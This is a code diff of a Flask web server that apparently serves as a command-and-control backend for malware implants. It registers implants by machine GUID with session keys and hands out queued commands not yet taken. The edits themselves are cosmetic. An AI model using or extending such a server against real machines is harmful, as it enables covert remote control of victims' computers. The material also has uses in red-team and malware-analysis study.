@@ -2,7 +2,7 @@ import functools
 import json
 import binascii
 from datetime import datetime
-from msilib.schema import Error
+# from msilib.schema import Error
 
 
 from flask import (
@@ -72,8 +72,10 @@ def register():
     try:
         if request.method == 'POST':
 
+
             print( request.json)
             computer_guid = request.json['computer_guid']
+
             imp_id = request.json['computer_guid']
 
             data = request.json['data']
@@ -91,8 +93,7 @@ def register():
                 try:
                     implant = Implant.query.filter_by(computer_guid=computer_guid).first()
 
-                    
-                    
+
                     if implant:
                         pk = implant.session_key
                         print(pk)
@@ -158,7 +159,7 @@ def get_next_command():
                     computer_guid=impl_id, status="not_taken_by_implant").first()
                 print(next_command)
                 if next_command:
-                    
+
                     command = next_command.command_text
                     now = datetime.now()
                     current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
